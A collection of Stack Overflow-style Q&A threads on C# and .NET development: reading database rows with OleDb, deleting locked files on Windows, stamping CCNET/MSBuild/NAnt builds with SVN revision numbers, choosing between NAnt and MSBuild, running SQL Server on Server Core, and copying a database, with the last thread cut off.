 <p>Very roughly and from memory since I don't have code on this laptop:</p>

<pre><code>using (OleDBConnection conn = new OleDbConnection())
{
  conn.ConnectionString = ""Whatever connection string"";

  using (OleDbCommand cmd = new OleDbCommand())
  {
    cmd.Connection = conn;
    cmd.CommandText = ""Select * from CoolTable"";

    using (OleDbDataReader dr = cmd.ExecuteReader())
    {
      while (dr.Read())
      {
        // do something like Console.WriteLine(dr[""column name""] as String);
      }
    }
  }
}
</code></pre>
 <p>@Goyuix -- that's excellent for something written from memory.
tested it here -- found the connection wasn't opened. Otherwise very nice.</p>

<pre><code>using System.Data.OleDb;
...

using (OleDbConnection conn = new OleDbConnection())
{
    conn.ConnectionString = ""Provider=sqloledb;Data Source=yourServername\\yourInstance;Initial Catalog=databaseName;Integrated Security=SSPI;"";

    using (OleDbCommand cmd = new OleDbCommand())
    {
        conn.Open();
        cmd.Connection = conn;
        cmd.CommandText = ""Select * from yourTable"";

        using (OleDbDataReader dr = cmd.ExecuteReader())
        {
            while (dr.Read())
            {
                Console.WriteLine(dr[""columnName""]);
            }
        }
    }
}
</code></pre>
 <p>That's definitely a good way to do it.  But you if you happen to be using a database that supports LINQ to SQL, it can be a lot more fun.  It can look something like this:</p>

<pre><code>MyDB db = new MyDB(""Data Source=..."");<br>var q = from db.MyTable<br>        select c;<br>foreach (var c in q)<br>  Console.WriteLine(c.MyField.ToString());<br></code></pre> <p>This is an alternative way (DataReader is faster than this one):</p>

<pre><code>string s = """";<br>SqlConnection conn = new SqlConnection(""Server=192.168.1.1;Database=master;Connect Timeout=30;User ID=foobar;Password=raboof;"");<br>SqlDataAdapter da = new SqlDataAdapter(""SELECT TOP 5 name, dbid FROM sysdatabases"", conn);<br>DataTable dt = new DataTable();<br><br>da.Fill(dt);<br><br>for (int i = 0; i &lt; dt.Rows.Count; i++)<br>{<br>    s += dt.Rows[i][""name""].ToString() + "" -- "" + dt.Rows[i][""dbid""].ToString() + ""\n"";<br>}<br><br>MessageBox.Show(s);<br></code></pre> <p>If you are querying a SQL Server database (Version 7 and up) you should replace the OleDb classes with corresponding classes in the <a href=""http://msdn.microsoft.com/en-us/library/system.data.sqlclient.aspx"" rel=""nofollow"">System.Data.SqlClient</a> namespace (<a href=""http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlconnection.aspx"" rel=""nofollow"">SqlConnection</a>, <a href=""http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlcommand.aspx"" rel=""nofollow"">SqlCommand</a> and <a href=""http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqldatareader.aspx"" rel=""nofollow"">SqlDataReader</a>) as those classes have been optimized to work with SQL Server.</p>

<p>Another thing to note is that you should 'never' select all as this might lead to unexpected results later on if you add or remove columns to this table.</p>
 <p>If you are intending on reading a large number of columns or records it's also worth caching the ordinals and accessing the strongly-typed methods, e.g.</p>

<pre><code>using (DbDataReader dr = cmd.ExecuteReader()) {
  if (dr.Read()) {
    int idxColumnName = dr.GetOrdinal(""columnName"");
    int idxSomethingElse = dr.GetOrdinal(""somethingElse"");

    do {
      Console.WriteLine(dr.GetString(idxColumnName));
      Console.WriteLine(dr.GetInt32(idxSomethingElse));
    } while (dr.Read());
  }
}
</code></pre>
 <p>I guess, you can try entity framework.</p>

<pre><code>using (SchoolDBEntities ctx = new SchoolDBEntities())
{
     IList&lt;Course&gt; courseList = ctx.GetCoursesByStudentId(1).ToList&lt;Course&gt;();
     //do something with courselist here
}
</code></pre>
"
"How do I delete a file which is locked by another process in C#? <p>I'm looking for a way to delete a file which is locked by another process using C#. I suspect the method must be able to find which process is locking the file (perhaps by tracking the handles, although I'm not sure how to do this in C#) then close that process before being able to complete the file delete using <code>File.Delete()</code>.</p>
 <p>You can use this program, <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896655.aspx"" rel=""nofollow"">Handle</a>, to find which process has the lock on your file. It's a command-line tool, so I guess you use the output from that... I'm not sure about finding it programmatically.</p>

<p>If deleting the file can wait, you could specify it for deletion when your computer next starts up:</p>

<ol>
<li><p>Start <code>REGEDT32 (W2K)</code> or <code>REGEDIT (WXP)</code> and navigate to:</p>

<pre><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager
</code></pre></li>
<li><p>W2K and WXP</p>

<ul>
<li><p><strong>W2K:</strong><br/>Edit<br/>Add Value...<br/>Data Type: <code>REG_MULTI_SZ</code><br/>Value Name: <code>PendingFileRenameOperations</code><br/><kbd>OK</kbd></p></li>
<li><p><strong>WXP:</strong><br/>Edit<br/>New<br/>Multi-String Value<br/><kbd>enter</kbd><br/>
<code>PendingFileRenameOperations</code></p></li>
</ul></li>
<li><p>In the Data area, enter <code>""\??\"" + filename</code> to be deleted. LFNs may
be entered without being embedded in quotes. To delete <code>C:\Long Directory Name\Long File Name.exe</code>, enter the following data:</p>

<pre><code>\??\C:\Long Directory Name\Long File Name.exe
</code></pre>

<p>Then press <kbd>OK</kbd>.</p></li>
<li><p>The ""destination file name"" is a null (zero) string. It is entered
as follows:</p>

<ul>
<li><p><strong>W2K:</strong><br/>Edit<br/>Binary<br/>select Data Format: Hex<br/>click at the end of the hex string<br/>enter 0000 (four zeros)<br/><kbd>OK</kbd></p></li>
<li><p><strong>WXP:</strong><br/>Right-click the value<br/>choose ""Modify Binary Data""<br/>click at the end of the hex string<br/>enter 0000 (four zeros)<br/><kbd>OK</kbd></p></li>
</ul></li>
<li><p>Close <code>REGEDT32/REGEDIT</code> and reboot to delete the file.</p></li>
</ol>

<p><sup>(Shamelessly stolen from <a href=""http://www.pcreview.co.uk/forums/thread-1581158.php"" rel=""nofollow"">some random forum</a>, for posterity's sake.)</sup></p>
 <p>Killing other processes is not a healthy thing to do. If your scenario involves something like uninstallation, you could use the <a href=""http://msdn.microsoft.com/en-us/library/aa365240%28VS.85%29.aspx""><strong><code>MoveFileEx</code></strong> API function</a> to mark the file for deletion upon next reboot.</p>

<p>If it appears that you really need to delete a file in use by another process, I'd recommend re-considering the actual problem before considering any solutions.</p>
 <p>If you want to do it programatically. I'm not sure... and I'd really recommend against it.
If you're just troubleshooting stuff on your own machine, <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx"">SysInternals Process Explorer</a> can help you</p>

<p>Run it, use the Find Handle command (I think it's either in the find or handle menu), and search for the name of your file. Once the handle(s) is found, you can forcibly close them.</p>

<p>You can then delete the file and so on.</p>

<p><strong>Beware</strong>, doing this may cause the program which owns the handles to behave strangely, as you've just pulled the proverbial rug out from under it, but it works well when you are debugging your own errant code, or when visual studio / windows explorer is being crap and not releasing file handles even though you told them to close the file ages ago... sigh :-)</p> <p>Oh, one big hack I employed years ago, is that Windows won't let you <em>delete</em> files, but it does let you <em>move</em> them.</p>

<p>Pseudo-sort-of-code:</p>

<pre><code>mv %WINDIR%\System32\mfc42.dll %WINDIR\System32\mfc42.dll.old
Install new mfc42.dll
Tell user to save work and restart applications
</code></pre>

<p>When the applications restarted (note we didn't need to reboot the machine), they loaded the new <code>mfc42.dll</code>, and all was well. That, coupled with <code>PendingFileOperations</code> to delete the old one the next time the whole system restarted, worked pretty well.</p>
 <P>The typical method is as follows. You've said you want to do this in C# so here goes...</P>
<OL>
<LI>If you don't know which process has the file locked, you'll need to examine each process's handle list, and query each handle to determine if it identifies the locked file. Doing this in C# will likely require P/Invoke or an intermediary C++/CLI to call the native APIs you'll need.</LI>
<LI>Once you've figured out which process(es) have the file locked, you'll need to safely inject a small native DLL into the process (you can also inject a managed DLL, but this is messier, as you then have to start or attach to the .NET runtime).</LI>
<LI>That bootstrap DLL then closes the handle using CloseHandle etc.</LI></OL>
<P>Essentially: the way to unlock a ""locked"" file is to inject a DLL into the offending process's address space and close it yourself. You can do this using native or managed code. No matter what, you're going to need a small amount of native code or at least P/Invoke into the same.</P>
<P>Helpful links:</P>
<UL>
<LI><A href=""http://www.codeproject.com/KB/threads/winspy.aspx"">http://www.codeproject.com/KB/threads/winspy.aspx</A></LI>
<LI><A href=""http://damianblog.com/2008/07/02/net-code-injection/"">http://damianblog.com/2008/07/02/net-code-injection/</A></LI></UL>
<P>Good luck!</P> <p>This looks promising. A way of killing the file handle....</p>

<p><a href=""http://www.timstall.com/2009/02/killing-file-handles-but-not-process.html"" rel=""nofollow"">http://www.timstall.com/2009/02/killing-file-handles-but-not-process.html</a></p>
 <p>Using Orion Edwards advice I downloaded the SysInternals Process Explorer which in turn allowed me to discover that the file I was havind difficulties deleting was in fact being held not by the Excel.Applications object I thought but rather the fact that my C# code send mail code had created an Attachment object that left a handle to this file open.</p>

<p>Once I saw this, I quite simple called on the dispose method of the Attachment object, and the handle was released.</p>

<p>the Sys Internals explorer allowed me to discover this used in conjuction with the VS2005 debugger.</p>

<p>I highly recommend this tool!</p>
"
"Use SVN Revision to label build in CCNET <p>I am using CCNET on a sample project with SVN as my source control. CCNET is configured to create a build on every check in. CCNET uses MSBuild to build the source code.</p>

<p>I would like to use the latest revision number to generate AssemblyInfo.cs while compiling.
How can I retrieve the latest revision from subversion and use the value in CCNET?</p>

<p>Edit: I'm not using NAnt - only MSBuild.</p> <p>I am currently ""manually"" doing it through a prebuild-exec Task, using my <a href=""http://www.stum.de/various-tools/cmdtools/"" rel=""nofollow"">cmdnetsvnrev</a> tool, but if someone knows a better ccnet-integrated way of doing it, i'd be happy to hear :-)</p> <p>I found <a href=""http://code.google.com/p/svnrevisionlabeller"" rel=""nofollow"">this</a> project on google code. This is <code>CCNET</code> plugin to generate the label in <code>CCNET</code>.</p>

<p>The <code>DLL</code> is tested with <code>CCNET 1.3</code> but it works with <code>CCNET 1.4</code> for me. I'm successfully using this plugin to label my build.</p>

<p>Now onto passing it to <code>MSBuild</code>...</p>
 <p>You have basically two options. Either you write a simple script that will start and parse output from</p>

<p><strong>svn.exe info --revision HEAD</strong></p>

<p>to obtain revision number (then generating AssemblyInfo.cs is pretty much straight forward) or just use plugin for CCNET. Here it is:</p>

<blockquote>
  <p><strong>SVN Revision Labeller</strong> is a plugin for
  CruiseControl.NET that allows you to
  generate CruiseControl labels for your
  builds, based upon the revision number
  of your Subversion working copy. This
  can be customised with a prefix and/or
  major/minor version numbers.</p>
  
  <p><a href=""http://code.google.com/p/svnrevisionlabeller/"" rel=""nofollow"">http://code.google.com/p/svnrevisionlabeller/</a></p>
</blockquote>

<p>I prefer the first option because it's only roughly 20 lines of code:</p>

<pre><code>using System;
using System.Diagnostics;

namespace SvnRevisionNumberParserSample
{
    class Program
    {
        static void Main()
        {
            Process p = Process.Start(new ProcessStartInfo()
                {
                    FileName = @""C:\Program Files\SlikSvn\bin\svn.exe"", // path to your svn.exe
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    Arguments = ""info --revision HEAD"",
                    WorkingDirectory = @""C:\MyProject"" // path to your svn working copy
                });

            // command ""svn.exe info --revision HEAD"" will produce a few lines of output
            p.WaitForExit();

            // our line starts with ""Revision: ""
            while (!p.StandardOutput.EndOfStream)
            {
                string line = p.StandardOutput.ReadLine();
                if (line.StartsWith(""Revision: ""))
                {
                    string revision = line.Substring(""Revision: "".Length);
                    Console.WriteLine(revision); // show revision number on screen                       
                    break;
                }
            }

            Console.Read();
        }
    }
}
</code></pre>
 <p>If you prefer doing it on the <code>MSBuild</code> side over the <code>CCNet</code> config, looks like the <code>MSBuild</code> Community Tasks extension's <a href=""http://msbuildtasks.tigris.org/"" rel=""nofollow""><code>SvnVersion</code></a> task might do the trick.</p>
 <blockquote>
  <p><strong>Customizing csproj files to autogenerate AssemblyInfo.cs</strong> <br>
  <a href=""http://www.codeproject.com/KB/dotnet/Customizing_csproj_files.aspx"" rel=""nofollow"">http://www.codeproject.com/KB/dotnet/Customizing_csproj_files.aspx</a></p>
  
  <p>Every time we create a new C# project,
  Visual Studio puts there the
  AssemblyInfo.cs file for us. The file
  defines the assembly meta-data like
  its version, configuration, or
  producer.</p>
</blockquote>

<p>Found the above technique to auto-gen AssemblyInfo.cs using MSBuild. Will post sample shortly.</p> <p>I have written a NAnt build file that handles parsing SVN information and creating properties. I then use those property values for a variety of build tasks, including setting the label on the build. I use this target combined with the SVN Revision Labeller mentioned by lubos hasko with great results.</p>

<pre><code>&lt;target name=""svninfo"" description=""get the svn checkout information""&gt;<br>    &lt;property name=""svn.infotempfile"" value=""${build.directory}\svninfo.txt"" /&gt;<br>    &lt;exec program=""${svn.executable}"" output=""${svn.infotempfile}""&gt;<br>        &lt;arg value=""info"" /&gt;<br>    &lt;/exec&gt;<br>    &lt;loadfile file=""${svn.infotempfile}"" property=""svn.info"" /&gt;<br>    &lt;delete file=""${svn.infotempfile}"" /&gt;<br><br>    &lt;property name=""match"" value="""" /&gt;<br><br>    &lt;regex pattern=""URL: (?'match'.*)"" input=""${svn.info}"" /&gt;<br>    &lt;property name=""svn.info.url"" value=""${match}""/&gt;<br><br>    &lt;regex pattern=""Repository Root: (?'match'.*)"" input=""${svn.info}"" /&gt;<br>    &lt;property name=""svn.info.repositoryroot"" value=""${match}""/&gt;<br><br>    &lt;regex pattern=""Revision: (?'match'\d+)"" input=""${svn.info}"" /&gt;<br>    &lt;property name=""svn.info.revision"" value=""${match}""/&gt;<br><br>    &lt;regex pattern=""Last Changed Author: (?'match'\w+)"" input=""${svn.info}"" /&gt;<br>    &lt;property name=""svn.info.lastchangedauthor"" value=""${match}""/&gt;<br><br>    &lt;echo message=""URL: ${svn.info.url}"" /&gt;<br>    &lt;echo message=""Repository Root: ${svn.info.repositoryroot}"" /&gt;<br>    &lt;echo message=""Revision: ${svn.info.revision}"" /&gt;<br>    &lt;echo message=""Last Changed Author: ${svn.info.lastchangedauthor}"" /&gt;<br>&lt;/target&gt;<br></code></pre> <p>My approach is to use the aforementioned plugin for ccnet and a nant echo task to generate a <code>VersionInfo.cs</code> file containing nothing but the version attributes. I only have to include the <code>VersionInfo.cs</code> file into the build</p>

<p>The echo task simply outputs the string I give it to a file.</p>

<p>If there is a similar MSBuild task, you can use the same approach. Here's the small nant task I use:</p>

<pre><code>&lt;target name=""version"" description=""outputs version number to VersionInfo.cs""&gt;
  &lt;echo file=""${projectdir}/Properties/VersionInfo.cs""&gt;
    [assembly: System.Reflection.AssemblyVersion(""$(CCNetLabel)"")]
    [assembly: System.Reflection.AssemblyFileVersion(""$(CCNetLabel)"")]
  &lt;/echo&gt;
&lt;/target&gt;
</code></pre>

<p>Try this:</p>

<pre><code>&lt;ItemGroup&gt;
    &lt;VersionInfoFile Include=""VersionInfo.cs""/&gt;
    &lt;VersionAttributes&gt;
        [assembly: System.Reflection.AssemblyVersion(""${CCNetLabel}"")]
        [assembly: System.Reflection.AssemblyFileVersion(""${CCNetLabel}"")]
    &lt;/VersionAttributes&gt;
&lt;/ItemGroup&gt;
&lt;Target Name=""WriteToFile""&gt;
    &lt;WriteLinesToFile
        File=""@(VersionInfoFile)""
        Lines=""@(VersionAttributes)""
        Overwrite=""true""/&gt;
&lt;/Target&gt;
</code></pre>

<p>Please note that I'm not very intimate with MSBuild, so my script will probably not work out-of-the-box and need corrections...</p>
 <p>Be careful.  The structure used for build numbers is only a short so you have a ceiling on how high your revision can go.</p>

<p>In our case, we've already exceeded the limit.</p>

<p>If you attempt to put in the build number 99.99.99.599999, the file version property will actually come out as 99.99.99.10175.</p>
 <p>CruiseControl.Net 1.4.4 has now an <a href=""http://confluence.public.thoughtworks.org/display/CCNET/Assembly+Version+Labeller"">Assembly Version Labeller</a>, which generates version numbers compatible with .Net assembly properties.</p>

<p>In my project I have it configured as:</p>

<pre><code>&lt;labeller type=""assemblyVersionLabeller"" incrementOnFailure=""true"" major=""1"" minor=""2""/&gt;
</code></pre>

<p>(Caveat: <code>assemblyVersionLabeller</code> won't start generating svn revision based labels until an actual commit-triggered build occurs.)</p>

<p>and then consume this from my MSBuild projects with <a href=""http://msbuildtasks.tigris.org/"">MSBuildCommunityTasks.AssemblyInfo</a> :</p>

<pre><code>&lt;Import Project=""$(MSBuildExtensionsPath)\MSBuildCommunityTasks\MSBuild.Community.Tasks.Targets""/&gt;
&lt;Target Name=""BeforeBuild""&gt;
  &lt;AssemblyInfo Condition=""'$(CCNetLabel)' != ''"" CodeLanguage=""CS"" OutputFile=""Properties\AssemblyInfo.cs"" 
  AssemblyTitle=""MyTitle"" AssemblyCompany=""MyCompany"" AssemblyProduct=""MyProduct""
  AssemblyCopyright=""Copyright ©  2009"" ComVisible=""false"" Guid=""some-random-guid""
  AssemblyVersion=""$(CCNetLabel)"" AssemblyFileVersion=""$(CCNetLabel)""/&gt;
&lt;/Target&gt;
</code></pre>

<p>For sake of completness, it's just as easy for projects using NAnt instead of MSBuild:</p>

<pre><code>&lt;target name=""setversion"" description=""Sets the version number to CruiseControl.Net label.""&gt;
    &lt;script language=""C#""&gt;
        &lt;references&gt;
            &lt;include name=""System.dll"" /&gt;
        &lt;/references&gt;
        &lt;imports&gt;
            &lt;import namespace=""System.Text.RegularExpressions"" /&gt;
        &lt;/imports&gt;
        &lt;code&gt;&lt;![CDATA[
             [TaskName(""setversion-task"")]
             public class SetVersionTask : Task
             {
              protected override void ExecuteTask()
              {
               StreamReader reader = new StreamReader(Project.Properties[""filename""]);
               string contents = reader.ReadToEnd();
               reader.Close();
               string replacement = ""[assembly: AssemblyVersion(\"""" + Project.Properties[""CCNetLabel""] + ""\"")]"";
               string newText = Regex.Replace(contents, @""\[assembly: AssemblyVersion\("""".*""""\)\]"", replacement);
               StreamWriter writer = new StreamWriter(Project.Properties[""filename""], false);
               writer.Write(newText);
               writer.Close();
              }
             }
             ]]&gt;
        &lt;/code&gt;
    &lt;/script&gt;
    &lt;foreach item=""File"" property=""filename""&gt;
        &lt;in&gt;
            &lt;items basedir=""..""&gt;
                &lt;include name=""**\AssemblyInfo.cs""&gt;&lt;/include&gt;
            &lt;/items&gt;
        &lt;/in&gt;
        &lt;do&gt;
            &lt;setversion-task /&gt;
        &lt;/do&gt;
    &lt;/foreach&gt;
&lt;/target&gt;
</code></pre>
 <p>Based on skolimas solution I updated the NAnt script to also update the AssemblyFileVersion. Thanks to skolima for the code!</p>

<pre><code>&lt;target name=""setversion"" description=""Sets the version number to current label.""&gt;
    	&lt;script language=""C#""&gt;
    		&lt;references&gt;
    				&lt;include name=""System.dll"" /&gt;
    		&lt;/references&gt;
    		&lt;imports&gt;
    				&lt;import namespace=""System.Text.RegularExpressions"" /&gt;
    		&lt;/imports&gt;
    		&lt;code&gt;&lt;![CDATA[
    				 [TaskName(""setversion-task"")]
    				 public class SetVersionTask : Task
    				 {
    				  protected override void ExecuteTask()
    				  {
    				   StreamReader reader = new StreamReader(Project.Properties[""filename""]);
    				   string contents = reader.ReadToEnd();
    				   reader.Close();					   
    				   // replace assembly version
    				   string replacement = ""[assembly: AssemblyVersion(\"""" + Project.Properties[""label""] + ""\"")]"";
    				   contents = Regex.Replace(contents, @""\[assembly: AssemblyVersion\("""".*""""\)\]"", replacement);					   					   
    				   // replace assembly file version
    				   replacement = ""[assembly: AssemblyFileVersion(\"""" + Project.Properties[""label""] + ""\"")]"";
    				   contents = Regex.Replace(contents, @""\[assembly: AssemblyFileVersion\("""".*""""\)\]"", replacement);					   					   
    				   StreamWriter writer = new StreamWriter(Project.Properties[""filename""], false);
    				   writer.Write(contents);
    				   writer.Close();
    				  }
    				 }
    				 ]]&gt;
    		&lt;/code&gt;
    	&lt;/script&gt;
    	&lt;foreach item=""File"" property=""filename""&gt;
    		&lt;in&gt;
    				&lt;items basedir=""${srcDir}""&gt;
    						&lt;include name=""**\AssemblyInfo.cs""&gt;&lt;/include&gt;
    				&lt;/items&gt;
    		&lt;/in&gt;
    		&lt;do&gt;
    				&lt;setversion-task /&gt;
    		&lt;/do&gt;
    	&lt;/foreach&gt;
    &lt;/target&gt;
</code></pre>
 <p>I'm not sure if this work with CCNET or not, but I've created an <a href=""http://happyturtle.codeplex.com/"" rel=""nofollow"">SVN version plug-in</a> for the <a href=""http://autobuildversion.codeplex.com/"" rel=""nofollow"">Build Version Increment</a> project on CodePlex.  This tool is pretty flexible and can be set to automatically create a version number for you using the svn revision.  It doesn't require writing any code or editing xml, so yay!</p>

<p>I hope this is helps!</p>
 <p>No idea where I found this.  But I found this on the internet ""somewhere"".</p>

<p>This updates all the AssemblyInfo.cs files before the build takes place.</p>

<p>Works like a charm.  All my exe's and dll's show up as 1.2.3.333 (If ""333"" were the SVN revision at the time.) (And the original version in the AssemblyInfo.cs file was listed as ""1.2.3.0"")</p>

<hr>

<p>$(ProjectDir)   (Where my .sln file resides)</p>

<p>$(SVNToolPath)  (points to svn.exe)</p>

<p>are my custom variables, their declarations/definitions are not defined below.</p>

<hr>

<p><a href=""http://msbuildtasks.tigris.org/"" rel=""nofollow"">http://msbuildtasks.tigris.org/</a>
and/or
<a href=""https://github.com/loresoft/msbuildtasks"" rel=""nofollow"">https://github.com/loresoft/msbuildtasks</a>
has the ( FileUpdate and SvnVersion ) tasks.</p>

<hr>

<pre><code>  &lt;Target Name=""SubVersionBeforeBuildVersionTagItUp""&gt;

    &lt;ItemGroup&gt;
      &lt;AssemblyInfoFiles Include=""$(ProjectDir)\**\*AssemblyInfo.cs"" /&gt;
    &lt;/ItemGroup&gt;

    &lt;SvnVersion LocalPath=""$(MSBuildProjectDirectory)"" ToolPath=""$(SVNToolPath)""&gt;
      &lt;Output TaskParameter=""Revision"" PropertyName=""MySubVersionRevision"" /&gt;
    &lt;/SvnVersion&gt;

    &lt;FileUpdate Files=""@(AssemblyInfoFiles)""
            Regex=""(\d+)\.(\d+)\.(\d+)\.(\d+)""
            ReplacementText=""$1.$2.$3.$(MySubVersionRevision)"" /&gt;
  &lt;/Target&gt;
</code></pre>

<p>EDIT --------------------------------------------------</p>

<p>The above may start failing after your SVN revision number reaches 65534 or higher.</p>

<p>See:</p>

<p><a href=""http://stackoverflow.com/questions/13414409/turn-off-warning-cs1607/13751833#13751833"">Turn off warning CS1607</a></p>

<p>Here is the workaround.</p>

<pre><code>&lt;FileUpdate Files=""@(AssemblyInfoFiles)""
Regex=""AssemblyFileVersion\(&amp;quot;(\d+)\.(\d+)\.(\d+)\.(\d+)""
ReplacementText=""AssemblyFileVersion(&amp;quot;$1.$2.$3.$(SubVersionRevision)"" /&gt;
</code></pre>

<p>The result of this should be:</p>

<p>In Windows/Explorer//File/Properties…….</p>

<p>Assembly Version will be 1.0.0.0.  </p>

<p>File Version will be 1.0.0.333 if 333 is the SVN revision.</p>
"
"Is nAnt still supported and suitable for .net 3.5/VS2008? <p>I am using MSBuild to build my stuff. I want to use CruiseControl.net as by Build Server.</p>

<p>Now, CCNET refers nAnt a lot, but it looks as if ccnet can do most of the stuff nant could do through the project configuration and msbuild. Also, nAnt seems a bit unsupported, with a Beta release that is almost a year old now.</p>

<p>In short: I am actually quite happy with MSBuild (especially since it's the ""official"" compiler front end) and a bit uncomfortable with nAnt, but I do not want to judge prematurely.</p>

<p>What would be reasons to use nAnt over MSBuild? Especially with ccnet, which seems to overlap a bit with nant in terms of features (and adding the automated build related stuff)</p> <p>In my opinion it is more a question of personal preference.  nAnt is a great framework and MSBuild is almost as capable.  With the ability to easily develop custom tasks (in both frameworks) you can accomplish almost anything that you need to do.</p>

<p>I cannot answer the ""still supported"" portion of your questions, but I would say if you are already comfortable with nAnt then it's probably viable.  If you (or someone in your group) is familiar with MSBuild then that is a fine way to go as well.</p> <p>Honestly it depends on what fits in to your environment better.  If you are using a lot of Non-Microsoft tools, nunit, ccnet, ncover.  You will probably find better support with nant.  Alternatively if you are using MSTest, TFSBuild, you will probably find MSBuild a better environment.  I would learn both and use which every fits more smoothly with your environment.</p> <p>If you've already got a bunch of custom tasks you use with nAnt, stick with it - you don't gain much with MSBuild.  That said, there doesn't seem to be anything that nAnt can do that MSBuild can't at its core.  Both can call external tools, both can run .Net-based custom tasks, and both have a bunch of community tasks out there.</p>

<p>We're using MSBuild here for the same reason you are - it's the default build system for VS now, and we didn't have any nAnt-specific stuff to worry about.</p>

<p>The <a href=""http://msbuildtasks.tigris.org/"" rel=""nofollow"">MSBuildCommunityTasks</a> are a good third-party task base to start with, and covers most of the custom stuff I ever did in nAnt, including VSS and Subversion support.</p> <p>If you are quite happy with MSBuild, then I would stick with MSBuild.  This may be one of those cases where the tool you learn first is the one you will prefer.  I started with NAnt and can't quite get used to MSBuild.  I'm sure they will both be around for quite some time.</p>

<p>There are some fundamental differences between the two, probably best highlighted by <a href=""http://forums.msdn.microsoft.com/en-US/msbuild/thread/994761a3-ea9d-40c7-8d4f-4c208b2023f6/"">this conversation between some NAnt fans and a Microsoftie</a>.</p>

<p>Interestingly, <a href=""http://codebetter.com/blogs/jeremy.miller/default.aspx"">Jeremy Miller</a> asked the exact opposite question <a href=""http://codebetter.com/blogs/jeremy.miller/archive/2007/09/20/is-there-a-good-reason-to-switch-to-msbuild.aspx"">on his blog</a> last year.  </p> <p>CC.NET is simply the build server technology, not the build script technology. We use CC.NET at work to very successfully call MSBuild build scripts with no problems.</p>

<p>NAnt is an older and more mature build scripting language, but they are both similar in how they work. There are very few things I could do in NAnt that I can't also do in MSBuild, so it really comes down to which one you are more comfortable with. As far as how active NAnt is, don't go by when the last release was...instead go by when the last nightly build was. NAnt tends to go a long time between releases, but the nightly builds are usually pretty stable.</p>
 <p>Like what so many people have already indicated, the answer here is ""it depends"". There are some things like <em>repeating operations</em> that are much simpler and cleaner in NAnt. See <a href=""http://forums.msdn.microsoft.com/en-US/msbuild/thread/417329cb-a6f6-45dd-9a56-98bb4aee74f9"" rel=""nofollow"">the MSDN forums</a> for a discussion about this.</p>
 <p>I find that you can also use a hybrid approach too, especially in larger projects.  A lot of our nant scripts are being converted to msbuild when new components are developed.  Both support the same major features and can call each other if you find a task that is natively supported in one but not the other.</p>

<p>For new .NET development starting with MSBuild can save you a lot of time since it can run the solution files directly.  Extending from the main compilation to perform other tasks (source control, deployment, etc) works quite well.</p>
"
"Is Windows Server 2008 ""Server Core"" appropriate for a SQL Server instance? <p>I'm setting up a dedicated SQL Server 2005 box on Windows Server 2008 this week, and would like to pare it down to be as barebones as possible while still being fully functional.</p>

<p>To that end, the ""Server Core"" option sounds appealing, but I'm not clear about whether or not I can run SQL Server on that SKU.  Several services are addressed on the <a href=""http://www.microsoft.com/windowsserver2008/en/us/compare-core-installation.aspx"">Microsoft website</a>, but I don't see any indication about SQL Server.</p>

<p>Does anyone know definitively?</p>
 <p>Not sure how credible <a href=""http://www.builderau.com.au/program/windows/soa/Getting-started-with-Windows-Server-2008-Core-edition/0,339024644,339288700,00.htm"">this source is</a>, but:</p>

<blockquote>
  <p>The Windows Server 2008 Core edition can:</p>
  
  <ul>
  <li><p>Run the file server role.</p></li>
  <li><p>Run the Hyper-V virtualization server role.</p></li>
  <li><p>Run the Directory Services role.</p></li>
  <li><p>Run the DHCP server role.</p></li>
  <li><p>Run the IIS Web server role.</p></li>
  <li><p>Run the DNS server role.</p></li>
  <li><p>Run Active Directory Lightweight Directory Services.</p></li>
  <li><p>Run the print server role.</p></li>
  </ul>
  
  <p>The Windows Server 2008 Core edition cannot:</p>
  
  <ul>
  <li><p>Run a SQL Server.</p></li>
  <li><p>Run an Exchange Server.</p></li>
  <li><p>Run Internet Explorer.</p></li>
  <li><p>Run Windows Explorer.</p></li>
  <li><p>Host a remote desktop session.</p></li>
  <li><p>Run MMC snap-in consoles locally.</p></li>
  </ul>
</blockquote>
 <p>No. For some things you will need the .net Framework (like reporting services), and you can't install it (in a supported way) in a server core.</p>
 <p>Server Core won't be very useful (to me at least, and I think many others as well) until they get a version of .Net framework on it.  Maybe a specialized subset like they have in the Compact Framework on smart phones.</p>
 <p>ASP.Net will be enabled on <a href=""http://blogs.technet.com/server_core/archive/2008/11/13/server-core-changes-in-windows-server-2008-r2.aspx"" rel=""nofollow"">server core in R2</a>.</p>
 <p>Server Core 2008 R2 can run Sql Server, but this is unsupported (for now). Check <a href=""http://www.nullsession.com/2009/06/02/sql-server-2008-on-server-core-2008-r2/"" rel=""nofollow"">http://www.nullsession.com/2009/06/02/sql-server-2008-on-server-core-2008-r2/</a> for an article + video on how it's done.</p>
 <p>Following are new features for Server 2008 R2 Server Core:</p>

<ul>
<li><p>.NET Framework – 2.0, 3.0, 3.5.1, 4.0 are now supported on Server Core installation</p></li>
<li><p>ASP.NET – as .NET is now supported on Server Core R2 ASP.NET can be enabled</p></li>
<li><p>PowerShell</p></li>
<li><p>AD CS – AD Certificate Services role can be installed on Server Core R2 system</p></li>
</ul>
"
"What is the best way to copy a database? <p>I always create a new empty database, after that backup and restore of the existing database into it, but is this really the best way? As it seems very error prone and over complicated for me.</p>
 <p>It is possible to skip the step of creating the empty database. You can create the new database as part of the restore process.</p>

<p>This is actually the easiest and best way I know of to clone a database. You can eliminate errors by scripting the backup and restore process rather than running it through the SQL Server Management Studio</p>

<p>There are two other options you could explore:</p>

<ol>
<li>Detach the database, copy the .mdf file and re-attach.</li>
<li>Use SQL Server Integration Services (SSIS) to copy all the objects over</li>
</ol>

<p>I suggest sticking with backup and restore and automating if necessary.</p> <p>Here's a dynamic sql script I've used in the past.  It can be further modified but it will give you the basics.  I prefer scripting it to avoid the mistakes you can make using the Management Studio:</p>

